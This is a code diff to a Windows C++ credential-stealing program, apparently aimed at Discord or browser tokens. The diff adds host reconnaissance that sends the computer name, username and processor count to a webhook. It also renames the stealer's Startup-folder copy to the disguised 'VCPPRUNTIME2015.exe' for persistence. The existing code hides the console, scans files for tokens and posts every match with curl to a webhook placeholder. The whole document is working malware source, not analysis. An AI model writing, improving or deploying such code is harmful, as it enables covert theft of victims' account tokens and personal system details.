@@ -10,7 +10,7 @@
 
 namespace fs = std::filesystem;
 
-std::string send_token(std::string token) {
+std::string webhookSend(std::string token) {
 
 	char cmd[1024];
 	sprintf(cmd, "curl -d \"content=%s\" WEBHOOKHERE", token.c_str());
@@ -40,17 +40,71 @@ bool pathExists(const std::string& s)
 	return (stat(s.c_str(), &buffer) == 0);
 }
 
-int main() {
+void sendPcInfo() {
+	SYSTEM_INFO siSysInfo;
+	GetSystemInfo(&siSysInfo);
+
+	std::string szProcCount = std::to_string(siSysInfo.dwNumberOfProcessors);
+
+	char szComputerName[1024];
+	DWORD dwSize = sizeof(szComputerName);
+	GetComputerNameA(szComputerName, &dwSize);
+
+	char szUsername[1024];
+	DWORD dwUser = sizeof(szUsername);
+	GetUserNameA(szUsername, &dwUser);
+
+	std::string szPc;
+
+	szPc.append("**Computer name: ");
+	szPc.append(szComputerName);
+	szPc.append("**\n");
+	szPc.append("**Username: ");
+	szPc.append(szUsername);
+	szPc.append("**\n");
+	szPc.append("**Processor count: ");
+	szPc.append(szProcCount);
+	szPc.append("**\n");
+
+	webhookSend(szPc);
+
+	return;
+}
+
+int main(int argc, char* argv[]) {
 	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+
+	// Computer informations
+
+	sendPcInfo();
+	Sleep(100); // Try to fix issues.
+
+
+	// Bug fix: not finding tokens on computer initialization!
+
+	const int SizeOf = sizeof(argv[0]);
+
+	char szStartupPath[SizeOf];
+	sprintf(szStartupPath, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\VCPPRUNTIME2015.exe", std::getenv("appdata"));
+
+	if (strcmp(argv[0],szStartupPath) == 0) // If in startup directory
+	{
+		Sleep(20000); // Wait, this should fix initialization issues.
+	}
+
+
+	// End bug fix.
+
 
 	// Persistence
 
 	char BUFFER[MAX_PATH];
+	GetModuleFileNameA(nullptr, BUFFER, MAX_PATH);
 	char szPath[1024];
 	char szPath2[1024];
 
 	GetModuleFileNameA(nullptr, BUFFER, MAX_PATH);
-	sprintf(szPath, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.exe", std::getenv("appdata"));
+	sprintf(szPath, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\VCPPRUNTIME2015.exe", std::getenv("appdata"));
 	fs::remove(szPath);
 	fs::copy(BUFFER, szPath);
 
@@ -90,6 +144,8 @@ int main() {
 			continue;
 		}
 
+
+
 		for (const auto& entry : fs::directory_iterator(path)) {
 			std::ifstream t(entry.path(), std::ios_base::binary);
 
@@ -111,8 +167,13 @@ int main() {
 			}
 
 			for (int i = 0; i < matches.size(); i++) {
-				send_token(matches[i]);
+				webhookSend(matches[i]);
+				Sleep(750);
 			}
 		}
+
+
+
 	}
+
 }
